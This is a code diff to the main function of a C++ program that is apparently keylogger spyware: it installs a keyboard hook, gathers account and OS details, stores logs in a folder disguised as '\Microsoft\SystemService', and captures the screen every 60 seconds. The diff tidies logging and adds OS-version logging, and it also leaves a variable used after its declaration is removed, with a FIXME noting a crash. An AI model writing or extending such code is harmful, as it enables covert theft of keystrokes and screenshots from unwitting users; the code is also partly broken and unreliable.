@@ -4,10 +4,9 @@
 #include "sys.h"
 #include "debug.h"
 
-
 int main() {
+
 #ifdef DEBUG_BUILD
-  ClientInfo clientInfo;
   Stream::GetAccountInfo(clientInfo);
   std::cout << "io";
 #endif
@@ -23,16 +22,20 @@ int main() {
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
-  Stream::GetAccountInfo(info);
+  Stream::GetAccountInfo(clientInfo);
 
   std::string path = Stream::GetPath("\\Microsoft\\SystemService");
 
   Stream::MakeDir(path);
   Stream::MakeFile();
 
-  Stream::WriteLog("[*] BOOT [*]",
-				   KeyHook::activeProcess,
-				   false);
+  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);
+
+  std::ostringstream ostream;
+  ostream << "[*] OS Info: " << clientInfo.osVersionInfo.dwMajorVersion << " "
+		  << clientInfo.osVersionInfo.dwMinorVersion << " [*]"; // FIXME 0xC0000005
+  std::string write = ostream.str();
+  Stream::WriteLog(write, KeyHook::activeProcess, false);
 
   Screen::CaptureScreen(path, "winpst", true, 60000);
 
